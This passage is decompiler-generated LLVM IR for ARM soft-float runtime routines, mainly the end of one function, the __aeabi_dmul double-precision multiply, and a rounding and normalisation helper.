  %tmp6 = icmp ult i32 %v0_1a5cc, 33554432
  br i1 %tmp6, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_1a5c4
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_1a5c4, %bb
  %v1_1a5e4 = phi i32 [ 3, %dec_label_pc_1a5c4 ], [ 6, %bb ]
  %tmp7 = icmp ult i32 %v0_1a5cc, 268435456
  br i1 %tmp7, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_1a5e4 = add nuw nsw i32 %v1_1a5e4, 3
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  %v0_1a5e8 = phi i32 [ %v1_1a5e4, %bb3 ], [ %v2_1a5e4, %bb4 ]
  %not. = icmp slt i32 %v0_1a5cc, 0
  %v4_1a5e8 = zext i1 %not. to i32
  %v5_1a5e8 = add nsw i32 %v0_1a5e8, %v4_1a5e8
  %v1_1a5ec = sub nsw i32 32, %v5_1a5e8
  %v0_1a5f0 = load i32, i32* @r0, align 4
  %v6_1a5f0 = shl i32 %v0_1a5f0, %v1_1a5ec
  store i32 %v6_1a5f0, i32* @ip, align 4
  %v6_1a5f4 = lshr i32 %v0_1a5f0, %v5_1a5e8
  %v1_1a5f8 = load i32, i32* @r1, align 4
  %v7_1a5f8 = shl i32 %v1_1a5f8, %v1_1a5ec
  %v8_1a5f8 = or i32 %v7_1a5f8, %v6_1a5f4
  %v6_1a5fc = lshr i32 %v1_1a5f8, %v5_1a5e8
  %v0_1a600 = load i32, i32* %r4.global-to-local, align 4
  %v2_1a600 = add i32 %v0_1a600, %v5_1a5e8
  store i32 %v2_1a600, i32* @r4, align 4
  %v4_1a604 = sext i32 %v8_1a5f8 to i64
  %v5_1a604 = call i32 @function_1a2e8(i64 %v4_1a604, i32 %v6_1a5fc, i32 %v5_1a5e8, i32 %v1_1a5ec)
  ret i32 %v5_1a604

; uselistorder directives
  uselistorder i32 %v5_1a5e8, { 2, 0, 1, 3, 4 }
  uselistorder i32 6, { 4, 24, 25, 3, 18, 19, 26, 27, 21, 22, 5, 6, 29, 2, 0, 7, 23, 1, 8, 9, 10, 11, 12, 13, 20, 14, 17, 15, 16, 28 }
  uselistorder i32 3, { 49, 12, 35, 59, 36, 60, 61, 62, 64, 8, 65, 16, 66, 54, 0, 13, 67, 9, 1, 2, 51, 55, 3, 4, 37, 38, 74, 39, 40, 41, 42, 43, 44, 56, 6, 20, 57, 21, 48, 7, 50, 45, 75, 14, 70, 18, 71, 17, 72, 19, 69, 10, 68, 11, 58, 5, 63, 73, 46, 22, 52, 23, 24, 53, 25, 47, 28, 27, 26, 34, 29, 30, 31, 32, 33, 15 }
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dmul(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = sext i32 %arg3 to i64
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp32 = trunc i64 %arg1 to i32
  store i32 %tmp32, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1a608 = load i32, i32* @r4, align 4
  store i32 %v3_1a608, i32* %stack_var_-16, align 4
  %v12_1a608 = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v4_1a614 = udiv i32 %arg2, 1048576
  %v5_1a614 = urem i32 %v4_1a614, 2048
  store i32 %v5_1a614, i32* %r4.global-to-local, align 4
  %v6_1a614 = icmp eq i32 %v5_1a614, 0
  br i1 %v6_1a614, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v5_1a618 = udiv i32 %arg4, 1048576
  %v6_1a618 = urem i32 %v5_1a618, 2048
  store i32 %v6_1a618, i32* @r5, align 4
  %v7_1a618 = icmp eq i32 %v6_1a618, 0
  br i1 %v7_1a618, label %.thread2, label %bb38

bb38:                                             ; preds = %bb
  %v5_1a61c = icmp eq i32 %v5_1a614, 2047
  br i1 %v5_1a61c, label %.thread2, label %bb39

bb39:                                             ; preds = %bb38
  %v5_1a620 = icmp eq i32 %v6_1a618, 2047
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb, %bb38, %bb39
  %v0_1a624 = phi i1 [ true, %bb ], [ true, %bb38 ], [ %v5_1a620, %bb39 ], [ true, %entry ]
  store i32 ptrtoint (i32* @global_var_1a628.697 to i32), i32* %lr.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %v0_1a624, i32 ptrtoint (i32* @global_var_1a800.695 to i32))
  %v0_1a628 = load i32, i32* %r4.global-to-local, align 4
  %v1_1a628 = load i32, i32* @r5, align 4
  %v2_1a628 = add i32 %v1_1a628, %v0_1a628
  store i32 %v2_1a628, i32* %r4.global-to-local, align 4
  %v2_1a62c = xor i32 %arg4, %arg2
  %v1_1a630 = load i32, i32* %ip.global-to-local, align 4
  %tmp51 = mul i32 %v1_1a630, -2097152
  %v5_1a630 = add i32 %tmp51, -1
  %v6_1a630 = and i32 %v5_1a630, %arg2
  store i32 %v6_1a630, i32* %r1.global-to-local, align 4
  %v6_1a634 = and i32 %v5_1a630, %arg4
  %v5_1a638 = mul i32 %arg2, 4096
  %v6_1a638 = or i32 %v5_1a638, %tmp32
  %v8_1a638 = icmp eq i32 %v6_1a638, 0
  br i1 %v8_1a638, label %.thread3, label %bb40

.thread3:                                         ; preds = %.thread2
  %v1_1a6405 = or i32 %v6_1a630, 1048576
  store i32 %v1_1a6405, i32* %r1.global-to-local, align 4
  %v1_1a6447 = or i32 %v6_1a634, 1048576
  br label %dec_label_pc_1a6c4

bb40:                                             ; preds = %.thread2
  %v6_1a63c = mul i32 %arg4, 4096
  %v7_1a63c = or i32 %v6_1a63c, %arg3
  %v9_1a63c = icmp eq i32 %v7_1a63c, 0
  %v1_1a640 = or i32 %v6_1a630, 1048576
  store i32 %v1_1a640, i32* %r1.global-to-local, align 4
  %v1_1a644 = or i32 %v6_1a634, 1048576
  br i1 %v9_1a63c, label %dec_label_pc_1a6c4, label %dec_label_pc_1a64c

dec_label_pc_1a64c:                               ; preds = %bb40
  %v6_1a64c = mul nuw i64 %tmp, %arg1
  %v7_1a64c = udiv i64 %v6_1a64c, 4294967296
  %v9_1a64c = trunc i64 %v6_1a64c to i32
  store i32 %v9_1a64c, i32* %ip.global-to-local, align 4
  %v7_1a654 = zext i32 %v1_1a640 to i64
  %v11_1a654 = mul nuw nsw i64 %v7_1a654, %tmp
  %v12_1a654 = add i64 %v11_1a654, %v7_1a64c
  %v1_1a658 = and i32 %v2_1a62c, -2147483648
  %v10_1a65c = zext i32 %v1_1a644 to i64
  %v11_1a65c = mul nuw i64 %v10_1a65c, %arg1
  %v12_1a65c = add i64 %v12_1a654, %v11_1a65c
  %v13_1a65c = udiv i64 %v12_1a65c, 4294967296
  %v15_1a65c = trunc i64 %v12_1a65c to i32
  %v10_1a664 = mul nuw i64 %v10_1a65c, %v7_1a654
  %v11_1a664 = add i64 %v13_1a65c, %v10_1a664
  %v12_1a664 = udiv i64 %v11_1a664, 4294967296
  %v13_1a664 = trunc i64 %v12_1a664 to i32
  %v14_1a664 = trunc i64 %v11_1a664 to i32
  %v2_1a668 = icmp eq i32 %v9_1a64c, 0
  br i1 %v2_1a668, label %bb42, label %bb41

bb41:                                             ; preds = %dec_label_pc_1a64c
  %v2_1a66c = or i32 %v15_1a65c, 1
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_1a64c, %bb41
  %storemerge = phi i32 [ %v2_1a66c, %bb41 ], [ %v15_1a65c, %dec_label_pc_1a64c ]
  %v0_1a680 = phi i32 [ %v2_1a66c, %bb41 ], [ %v15_1a65c, %dec_label_pc_1a64c ]
  store i32 %storemerge, i32* %lr.global-to-local, align 4
  %v1_1a670 = add i32 %v2_1a628, -255
  %v2_1a674 = icmp ugt i32 %v13_1a664, 511
  %v2_1a678 = icmp eq i1 %v2_1a674, false
  %v3_1a678 = add i32 %v2_1a628, -1023
  %v5_1a678 = sext i1 %v2_1a678 to i32
  %v6_1a678 = add i32 %v3_1a678, %v5_1a678
  store i32 %v6_1a678, i32* %r4.global-to-local, align 4
  %v3_1a67c = icmp ugt i32 %v1_1a670, 768
  br i1 %v3_1a67c, label %dec_label_pc_1a68c, label %dec_label_pc_1a680

dec_label_pc_1a680:                               ; preds = %bb42
  %v1_1a680 = icmp slt i32 %v0_1a680, 0
  %v2_1a680 = mul i32 %v0_1a680, 2
  store i32 %v2_1a680, i32* %lr.global-to-local, align 4
  %v3_1a684 = mul i32 %v14_1a664, 2
  %v4_1a684 = zext i1 %v1_1a680 to i32
  %v5_1a684 = or i32 %v4_1a684, %v3_1a684
  %v9_1a684 = icmp ule i32 %v5_1a684, %v14_1a664
  %v10_1a684 = icmp ult i32 %v3_1a684, %v14_1a664
  %v11_1a684 = select i1 %v1_1a680, i1 %v9_1a684, i1 %v10_1a684
  %v3_1a68825 = mul nuw nsw i64 %v12_1a664, 2
  %v3_1a688 = trunc i64 %v3_1a68825 to i32
  %v4_1a688 = zext i1 %v11_1a684 to i32
  %v5_1a688 = or i32 %v4_1a688, %v3_1a688
  br label %dec_label_pc_1a68c

dec_label_pc_1a68c:                               ; preds = %bb42, %dec_label_pc_1a680
  %v0_1a69c = phi i32 [ %v0_1a680, %bb42 ], [ %v2_1a680, %dec_label_pc_1a680 ]
  %v0_1a694 = phi i32 [ %v14_1a664, %bb42 ], [ %v5_1a684, %dec_label_pc_1a680 ]
  %v1_1a68c = phi i32 [ %v13_1a664, %bb42 ], [ %v5_1a688, %dec_label_pc_1a680 ]
  %v4_1a68c = mul i32 %v1_1a68c, 2048
  %v4_1a690 = udiv i32 %v0_1a694, 2097152
  %v5_1a68c = or i32 %v4_1a690, %v1_1a658
  %v5_1a690 = or i32 %v5_1a68c, %v4_1a68c
  store i32 %v5_1a690, i32* %r1.global-to-local, align 4
  %v3_1a694 = mul i32 %v0_1a694, 2048
  %v4_1a698 = udiv i32 %v0_1a69c, 2097152
  %v5_1a698 = or i32 %v3_1a694, %v4_1a698
  store i32 %v5_1a698, i32* %r0.global-to-local, align 4
  %v3_1a69c = mul i32 %v0_1a69c, 2048
  store i32 %v3_1a69c, i32* %lr.global-to-local, align 4
  %v1_1a6a0 = add i32 %v6_1a678, -253
  store i32 %v1_1a6a0, i32* %ip.global-to-local, align 4
  %v2_1a6a0 = icmp ugt i32 %v6_1a678, 252
  %v7_1a6a0 = icmp eq i32 %v6_1a678, 253
  %v2_1a6a4 = xor i1 %v7_1a6a0, true
  %v3_1a6a4 = and i1 %v2_1a6a0, %v2_1a6a4
  br i1 %v3_1a6a4, label %bb43, label %bb44

bb43:                                             ; preds = %dec_label_pc_1a68c
  %v6_1a6a4 = icmp ugt i32 %v1_1a6a0, 1791
  %v11_1a6a4 = icmp eq i32 %v1_1a6a0, 1792
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_1a68c, %bb43
  %v1_1a6a8 = phi i1 [ %v7_1a6a0, %dec_label_pc_1a68c ], [ %v11_1a6a4, %bb43 ]
  %v0_1a6a8 = phi i1 [ %v2_1a6a0, %dec_label_pc_1a68c ], [ %v6_1a6a4, %bb43 ]
  %v2_1a6a8 = xor i1 %v1_1a6a8, true
  %v3_1a6a8 = and i1 %v0_1a6a8, %v2_1a6a8
  call void @__pseudo_cond_branch(i1 %v3_1a6a8, i32 ptrtoint (i32* @global_var_1a6f4.696 to i32))
  %v0_1a6ac = load i32, i32* %lr.global-to-local, align 4
  %v2_1a6ac = icmp slt i32 %v0_1a6ac, 0
  %v6_1a6ac = icmp eq i32 %v0_1a6ac, -2147483648
  %v1_1a6b0 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_1a6ac, label %bb45, label %._crit_edge

bb45:                                             ; preds = %bb44
  %v2_1a6b0 = urem i32 %v1_1a6b0, 2
  %v3_1a6b0 = icmp ne i32 %v2_1a6b0, 0
  %v4_1a6b0 = udiv i32 %v1_1a6b0, 2
  store i32 %v4_1a6b0, i32* %lr.global-to-local, align 4
  br label %._crit_edge

._crit_edge:                                      ; preds = %bb44, %bb45
  %v1_1a6b4 = phi i1 [ %v3_1a6b0, %bb45 ], [ %v2_1a6ac, %bb44 ]
  %v2_1a6b4 = zext i1 %v1_1a6b4 to i32
  %v3_1a6b4 = add i32 %v2_1a6b4, %v1_1a6b0
  store i32 %v3_1a6b4, i32* %r0.global-to-local, align 4
  %v0_1a6b8 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a6b8 = load i32, i32* %r4.global-to-local, align 4
  %v2_1a6b8 = and i32 %v1_1a6b8, 4096
  %v3_1a6b8 = icmp ne i32 %v2_1a6b8, 0
  %v4_1a6b8 = mul i32 %v1_1a6b8, 1048576
  %v6_1a6b8 = add i32 %v4_1a6b8, %v0_1a6b8
  %v7_1a6b8 = zext i1 %v3_1a6b8 to i32
  %v8_1a6b8 = add i32 %v7_1a6b8, %v6_1a6b8
  store i32 %v8_1a6b8, i32* %r1.global-to-local, align 4
  %v2_1a6bc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1a6bc, i32* %r4.global-to-local, align 4
  store i32 %v12_1a608, i32* %lr.global-to-local, align 4
  ret i32 %v3_1a6b4

dec_label_pc_1a6c4:                               ; preds = %.thread3, %bb40
  %v1_1a6d0 = phi i32 [ %v1_1a6447, %.thread3 ], [ %v1_1a644, %bb40 ]
  %v1_1a6c8 = phi i32 [ %v1_1a6405, %.thread3 ], [ %v1_1a640, %bb40 ]
  %v1_1a6c4 = and i32 %v2_1a62c, -2147483648
  %v2_1a6c8 = or i32 %v1_1a6c8, %v1_1a6c4
  %v4_1a6cc1 = or i64 %tmp, %arg1
  %v4_1a6cc = trunc i64 %v4_1a6cc1 to i32
  store i32 %v4_1a6cc, i32* %r0.global-to-local, align 4
  %v2_1a6d0 = xor i32 %v2_1a6c8, %v1_1a6d0
  store i32 %v2_1a6d0, i32* %r1.global-to-local, align 4
  %v4_1a6d4 = udiv i32 %v1_1a630, 2
  %v5_1a6d4 = sub i32 %v2_1a628, %v4_1a6d4
  store i32 %v5_1a6d4, i32* %r4.global-to-local, align 4
  %v7_1a6d4 = sub i32 0, %v5_1a6d4
  %v8_1a6d4 = and i32 %v2_1a628, %v7_1a6d4
  %v11_1a6d4 = icmp eq i32 %v2_1a628, %v4_1a6d4
  %v7_1a6d8 = icmp sgt i32 %v2_1a628, %v4_1a6d4
  br i1 %v7_1a6d8, label %bb46, label %bb47

bb46:                                             ; preds = %dec_label_pc_1a6c4
  %v10_1a6d8 = sub i32 %v1_1a630, %v5_1a6d4
  %v12_1a6d8 = xor i32 %v5_1a6d4, %v1_1a630
  %v13_1a6d8 = xor i32 %v10_1a6d8, %v1_1a630
  %v14_1a6d8 = and i32 %v13_1a6d8, %v12_1a6d8
  %v17_1a6d8 = icmp eq i32 %v1_1a630, %v5_1a6d4
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_1a6c4, %bb46
  %v3_1a6e4.in = phi i32 [ %v8_1a6d4, %dec_label_pc_1a6c4 ], [ %v14_1a6d8, %bb46 ]
  %v2_1a6e4.in = phi i32 [ %v5_1a6d4, %dec_label_pc_1a6c4 ], [ %v10_1a6d8, %bb46 ]
  %v1_1a6e4 = phi i1 [ %v11_1a6d4, %dec_label_pc_1a6c4 ], [ %v17_1a6d8, %bb46 ]
  %v2_1a6e4 = icmp slt i32 %v2_1a6e4.in, 0
  %v3_1a6e4 = icmp slt i32 %v3_1a6e4.in, 0
  %v3_1a6dc = xor i1 %v3_1a6e4, %v2_1a6e4
  %v4_1a6dc = or i1 %v1_1a6e4, %v3_1a6dc
  br i1 %v4_1a6dc, label %._crit_edge23, label %bb48

._crit_edge23:                                    ; preds = %bb47
  %v0_1a6e4.pre = load i32, i32* %lr.global-to-local, align 4
  br label %bb49

bb48:                                             ; preds = %bb47
  %v9_1a6dc30 = mul i32 %v5_1a6d4, 1048576
  %v10_1a6dc31 = or i32 %v2_1a6d0, %v9_1a6dc30
  store i32 %v10_1a6dc31, i32* %r1.global-to-local, align 4
  %v7_1a6e0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v7_1a6e0, i32* %r4.global-to-local, align 4
  store i32 %v12_1a608, i32* %lr.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %._crit_edge23, %bb48
  %v0_1a6e4 = phi i32 [ %v0_1a6e4.pre, %._crit_edge23 ], [ %v12_1a608, %bb48 ]
  %v6_1a6e4 = xor i1 %v4_1a6dc, true
  call void @__pseudo_cond_branch(i1 %v6_1a6e4, i32 %v0_1a6e4)
  %v0_1a6e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a6e8 = or i32 %v0_1a6e8, 1048576
  store i32 %v1_1a6e8, i32* %r1.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_1a6f0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1a6f0 = add i32 %v0_1a6f0, -1
  store i32 %v1_1a6f0, i32* %r4.global-to-local, align 4
  ret i32 %v4_1a6cc

; uselistorder directives
  uselistorder i32 %v5_1a6d4, { 1, 0, 5, 3, 4, 2, 6 }
  uselistorder i32 %v4_1a6d4, { 2, 1, 0 }
  uselistorder i32 %v1_1a6b0, { 2, 0, 1 }
  uselistorder i32 %v0_1a6ac, { 1, 0 }
  uselistorder i1 %v7_1a6a0, { 1, 0 }
  uselistorder i32 %v2_1a680, { 1, 0 }
  uselistorder i1 %v1_1a680, { 1, 0 }
  uselistorder i32 %v6_1a678, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1a680, { 1, 0, 2 }
  uselistorder i32 %v14_1a664, { 1, 3, 2, 0 }
  uselistorder i64 %v11_1a664, { 1, 0 }
  uselistorder i64 %v12_1a65c, { 1, 0 }
  uselistorder i64 %v10_1a65c, { 1, 0 }
  uselistorder i64 %v7_1a654, { 1, 0 }
  uselistorder i64 %v6_1a64c, { 1, 0 }
  uselistorder i32 %v6_1a634, { 1, 0 }
  uselistorder i32 %v6_1a630, { 1, 0, 2 }
  uselistorder i32 %v1_1a630, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 %v2_1a628, { 4, 3, 0, 2, 1, 5, 6 }
  uselistorder i32 %v6_1a618, { 2, 1, 0 }
  uselistorder i32 %v5_1a614, { 2, 1, 0 }
  uselistorder i32 %v12_1a608, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 8, 10, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i32 -255, { 6, 0, 2, 3, 1, 4, 5 }
  uselistorder i32 %arg4, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_1a6c4, { 1, 0 }
  uselistorder label %._crit_edge, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_1a68c, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %.thread2, { 3, 2, 1, 0 }
}

define i32 @function_1a6f4() local_unnamed_addr {
dec_label_pc_1a6f4:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_16 = alloca i32, align 4
  %v0_1a6f4 = load i1, i1* @cpsr_z, align 1
  %v1_1a6f4 = load i1, i1* @cpsr_n, align 1
  %v2_1a6f4 = load i1, i1* @cpsr_v, align 1
  %v3_1a6f4 = xor i1 %v1_1a6f4, %v2_1a6f4
  %v4_1a6f4 = or i1 %v0_1a6f4, %v3_1a6f4
  br i1 %v4_1a6f4, label %dec_label_pc_1a6f8, label %dec_label_pc_1a870

dec_label_pc_1a6f8:                               ; preds = %dec_label_pc_1a6f4
  %v0_1a6f8 = load i32, i32* @r4, align 4
  %v4_1a6f8 = add i32 %v0_1a6f8, 54
  %v6_1a6f8 = sub i32 0, %v0_1a6f8
  %v7_1a6f8 = and i32 %v4_1a6f8, %v6_1a6f8
  %v8_1a6f8 = icmp slt i32 %v7_1a6f8, 0
  %v9_1a6f8 = icmp slt i32 %v4_1a6f8, 0
  %v10_1a6f8 = icmp eq i32 %v4_1a6f8, 0
  %v7_1a6fc = icmp sgt i32 %v0_1a6f8, -54
  br i1 %v7_1a6fc, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_1a6f8
  store i32 0, i32* @r0, align 4
  %v8_1a700 = load i32, i32* @r1, align 4
  %v9_1a700 = and i32 %v8_1a700, -2147483648
  store i32 %v9_1a700, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1a6f8, %bb
  %v4_1a708 = xor i1 %v9_1a6f8, %v8_1a6f8
  %v5_1a708 = or i1 %v10_1a6f8, %v4_1a708
  call void @__pseudo_cond_branch(i1 %v5_1a708, i32 %tmp7)
  %v0_1a70c = load i32, i32* @r4, align 4
  %v1_1a70c = sub i32 0, %v0_1a70c
  %v2_1a710 = sub i32 -32, %v0_1a70c
  %v4_1a710 = add i32 %v0_1a70c, 31
  %v5_1a710 = and i32 %v4_1a710, %v1_1a70c
  %v6_1a710 = icmp slt i32 %v5_1a710, 0
  store i1 %v6_1a710, i1* @cpsr_v, align 1
  %v6_1a714 = icmp slt i32 %v1_1a70c, 32
  br i1 %v6_1a714, label %dec_label_pc_1a718, label %dec_label_pc_1a784

dec_label_pc_1a718:                               ; preds = %.thread1
  %v1_1a718 = add i32 %v2_1a710, 12
  %v8_1a71c = icmp sgt i32 %v1_1a718, 0
  br i1 %v8_1a71c, label %dec_label_pc_1a754, label %dec_label_pc_1a720

dec_label_pc_1a720:                               ; preds = %dec_label_pc_1a718
  %v1_1a720 = add i32 %v2_1a710, 32
  %v1_1a724 = sub i32 0, %v2_1a710
  %v0_1a728 = load i32, i32* @r0, align 4
  %v6_1a728 = shl i32 %v0_1a728, %v1_1a724
  %v2_1a72c = add i32 %v2_1a710, 31
  %v3_1a72c = shl i32 1, %v2_1a72c
  %v6_1a72c = lshr i32 %v0_1a728, %v1_1a720
  %v1_1a730 = load i32, i32* @r1, align 4
  %v7_1a730 = shl i32 %v1_1a730, %v1_1a724
  %v8_1a730 = or i32 %v7_1a730, %v6_1a72c
  %v1_1a734 = and i32 %v1_1a730, -2147483648
  %tmp = bitcast i32 %v1_1a730 to float
  %tmp19 = call float @fabsf(float %tmp)
  %v1_1a738 = bitcast float %tmp19 to i32
  %tmp20 = icmp slt i32 %v6_1a728, 0
  %v4_1a73c = zext i1 %tmp20 to i32
  %v5_1a73c = add i32 %v8_1a730, %v4_1a73c
  %v5_1a740 = and i32 %v1_1a738, %v3_1a72c
  %v6_1a740 = icmp ne i32 %v5_1a740, 0
  %v7_1a740 = lshr i32 %v1_1a738, %v1_1a720
  %v9_1a740 = add i32 %v7_1a740, %v1_1a734
  %v10_1a740 = zext i1 %v6_1a740 to i32
  %v11_1a740 = add i32 %v9_1a740, %v10_1a740
  store i32 %v11_1a740, i32* @r1, align 4
  %v19_1a740 = add i32 %v11_1a740, %v10_1a740
  %v20_1a740 = xor i32 %v19_1a740, %v1_1a730
  %v21_1a740 = xor i32 %v19_1a740, %v7_1a740
  %v22_1a740 = and i32 %v20_1a740, %v21_1a740
  %v23_1a740 = icmp slt i32 %v22_1a740, 0
  store i1 %v23_1a740, i1* @cpsr_v, align 1
  %v3_1a744 = mul i32 %v6_1a728, 2
  %v4_1a744 = or i32 %v3_1a744, %tmp7
  %v5_1a744 = icmp slt i32 %v4_1a744, 0
  store i1 %v5_1a744, i1* @cpsr_n, align 1
  %v6_1a744 = icmp eq i32 %v4_1a744, 0
  store i1 %v6_1a744, i1* @cpsr_z, align 1
  br i1 %v6_1a744, label %bb13, label %bb14

bb13:                                             ; preds = %dec_label_pc_1a720
  %tmp21 = sext i1 %tmp20 to i32
  %v6_1a748 = add nsw i32 %tmp21, -1
  %v7_1a748 = and i32 %v5_1a73c, %v6_1a748
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_1a720, %bb13
  %v1_1a750 = phi i32 [ %v5_1a73c, %dec_label_pc_1a720 ], [ %v7_1a748, %bb13 ]
  %v2_1a74c = load i32, i32* %stack_var_16, align 4
  store i32 %v2_1a74c, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_1a750

dec_label_pc_1a754:                               ; preds = %dec_label_pc_1a718
  %v1_1a754 = sub i32 0, %v2_1a710
  %v1_1a758 = add i32 %v2_1a710, 32
  %v0_1a75c = load i32, i32* @r0, align 4
  %v6_1a75c = shl i32 %v0_1a75c, %v1_1a754
  %v6_1a760 = lshr i32 %v0_1a75c, %v1_1a758
  %v1_1a764 = load i32, i32* @r1, align 4
  %v7_1a764 = shl i32 %v1_1a764, %v1_1a754
  %v8_1a764 = or i32 %v7_1a764, %v6_1a760
  %v1_1a768 = and i32 %v1_1a764, -2147483648
  %tmp22 = icmp slt i32 %v6_1a75c, 0
  %v4_1a76c = zext i1 %tmp22 to i32
  %v5_1a76c = add i32 %v8_1a764, %v4_1a76c
  %v6_1a76c = icmp ult i32 %v5_1a76c, %v8_1a764
  %v2_1a770 = zext i1 %v6_1a76c to i32
  %v3_1a770 = or i32 %v2_1a770, %v1_1a768
  store i32 %v3_1a770, i32* @r1, align 4
  %v9_1a770 = add nsw i32 %v3_1a770, %v2_1a770
  %v10_1a770 = sub i32 0, %v1_1a764
  %v11_1a770 = and i32 %v9_1a770, %v10_1a770
  %v12_1a770 = icmp slt i32 %v11_1a770, 0
  store i1 %v12_1a770, i1* @cpsr_v, align 1
  %v3_1a774 = mul i32 %v6_1a75c, 2
  %v4_1a774 = or i32 %v3_1a774, %tmp7
  %v5_1a774 = icmp slt i32 %v4_1a774, 0
  store i1 %v5_1a774, i1* @cpsr_n, align 1
  %v6_1a774 = icmp eq i32 %v4_1a774, 0
  store i1 %v6_1a774, i1* @cpsr_z, align 1
  br i1 %v6_1a774, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_1a754
  %tmp23 = sext i1 %tmp22 to i32
  %v6_1a778 = add nsw i32 %tmp23, -1
  %v7_1a778 = and i32 %v5_1a76c, %v6_1a778
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_1a754, %bb15
  %v1_1a780 = phi i32 [ %v5_1a76c, %dec_label_pc_1a754 ], [ %v7_1a778, %bb15 ]
  %v2_1a77c = load i32, i32* %stack_var_16, align 4
  store i32 %v2_1a77c, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_1a780

dec_label_pc_1a784:                               ; preds = %.thread1
  %v1_1a784 = sub i32 32, %v2_1a710
  %v1_1a788 = load i32, i32* @r0, align 4
  %v7_1a788 = shl i32 %v1_1a788, %v1_1a784
  %v8_1a788 = or i32 %v7_1a788, %tmp7
  %v6_1a78c = lshr i32 %v1_1a788, %v2_1a710
  %v1_1a790 = load i32, i32* @r1, align 4
  %v7_1a790 = shl i32 %v1_1a790, %v1_1a784
  %v8_1a790 = or i32 %v7_1a790, %v6_1a78c
  %v6_1a794 = lshr i32 %v1_1a790, %v2_1a710
  %v1_1a798 = and i32 %v1_1a790, -2147483648
  store i32 %v1_1a798, i32* @r1, align 4
  %v7_1a79c = lshr i32 %v1_1a798, %v2_1a710
  %v8_1a79c = sub i32 -1, %v7_1a79c
  %v9_1a79c = and i32 %v6_1a794, %v8_1a79c
  %tmp24 = icmp slt i32 %v8_1a790, 0
  %v4_1a7a0 = zext i1 %tmp24 to i32
  %v5_1a7a0 = add i32 %v4_1a7a0, %v9_1a79c
  %v3_1a7a4 = mul i32 %v8_1a790, 2
  %v4_1a7a4 = or i32 %v8_1a788, %v3_1a7a4
  %v5_1a7a4 = icmp slt i32 %v4_1a7a4, 0
  store i1 %v5_1a7a4, i1* @cpsr_n, align 1
  %v6_1a7a4 = icmp eq i32 %v4_1a7a4, 0
  store i1 %v6_1a7a4, i1* @cpsr_z, align 1
  br i1 %v6_1a7a4, label %bb17, label %bb18

bb17:                                             ; preds = %dec_label_pc_1a784
  %tmp25 = sext i1 %tmp24 to i32
  %v6_1a7a8 = add nsw i32 %tmp25, -1
  %v7_1a7a8 = and i32 %v5_1a7a0, %v6_1a7a8
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_1a784, %bb17
  %v1_1a7b0 = phi i32 [ %v5_1a7a0, %dec_label_pc_1a784 ], [ %v7_1a7a8, %bb17 ]
  %v2_1a7ac = load i32, i32* %stack_var_16, align 4
  store i32 %v2_1a7ac, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_1a7b0

dec_label_pc_1a870:                               ; preds = %dec_label_pc_1a6f4
  %v0_1a870 = load i32, i32* @r1, align 4
  %v1_1a870 = and i32 %v0_1a870, -2147483648
  %v1_1a878 = or i32 %v1_1a870, 2146435072
  store i32 %v1_1a878, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v5_1a7a0, { 1, 0 }
